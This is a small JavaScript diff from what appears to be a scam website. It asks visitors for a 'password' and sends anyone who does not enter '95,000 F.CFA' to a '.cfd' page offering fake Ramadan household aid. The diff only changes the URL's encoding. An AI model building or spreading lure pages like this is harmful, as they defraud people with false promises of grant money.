@@ -6,5 +6,5 @@ password = prompt(
 );
 
 if (password !== '95,000 F.CFA') {
-    location.href = 'https://ongoing-grant.cfd/Soutien-Aux-M%C3%A9nages-Du-Ramadan.html';
+    location.href = 'https://ongoing-grant.cfd/Soutien-Aux-Menages-Du-Ramadan.html';
 }
